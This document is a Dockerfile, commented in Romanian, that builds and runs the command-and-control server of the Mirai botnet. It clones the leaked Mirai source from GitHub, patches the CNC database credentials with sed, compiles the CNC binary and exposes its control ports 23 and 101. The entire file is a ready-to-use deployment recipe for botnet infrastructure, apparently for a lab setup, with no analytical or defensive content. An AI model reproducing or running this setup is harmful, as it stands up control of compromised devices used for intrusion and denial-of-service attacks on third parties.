# Folosim imaginea oficială Go, care include tot ce avem nevoie pentru a dezvolta și rula aplicații Go.
FROM golang:latest

# Instalăm pachetele necesare: git, serverul și clientul MariaDB, și telnet.
RUN apt update && apt install -y git mariadb-server mariadb-client telnet

# Setăm directorul de lucru la /app, unde vom pune codul și alte fișiere.
WORKDIR /app

# Copiem fișierul SQL (pentru baza de date) și scriptul entrypoint în container.
COPY ./db.sql /app
COPY ./entrypoint.sh /app

# Clonăm repository-ul cu codul sursă al botului Mirai.
RUN git clone https://github.com/jgamblin/Mirai-Source-Code.git
# Intrăm în directorul botului Mirai.
WORKDIR /app/Mirai-Source-Code/mirai

# Modificăm fișierul 'main.go' pentru a schimba utilizatorul și parola pentru accesul la baza de date.
RUN sed -i 's/root/asodb/' /app/Mirai-Source-Code/mirai/cnc/main.go
RUN sed -i 's/password/asodb/' /app/Mirai-Source-Code/mirai/cnc/main.go

# Inițializăm un modul Go pentru aplicația CNC.
RUN go mod init cnc.mirai
# Încărcăm și rezolvăm dependențele Go necesare.
RUN go mod tidy
# Compilăm aplicația CNC și salvăm binarul în directorul /app.
RUN go build -o /app/cnc cnc/*.go

# Mutăm fișierul 'prompt.txt' în directorul unde s-a creeat executabilul go. Fara acesta nu merge cnc ul.
RUN mv ./prompt.txt /app/

# Setăm directorul de lucru la /app pentru pașii următori.
WORKDIR /app

# Expunem porturile 23 și 101, necesare pentru comunicarea CNC.
EXPOSE 23 101

# Dăm permisiuni de execuție scriptului entrypoint.
RUN chmod +x /app/entrypoint.sh
# Setăm scriptul entrypoint ca fiind comanda care va rula când containerul este pornit.
ENTRYPOINT ["/app/entrypoint.sh"]
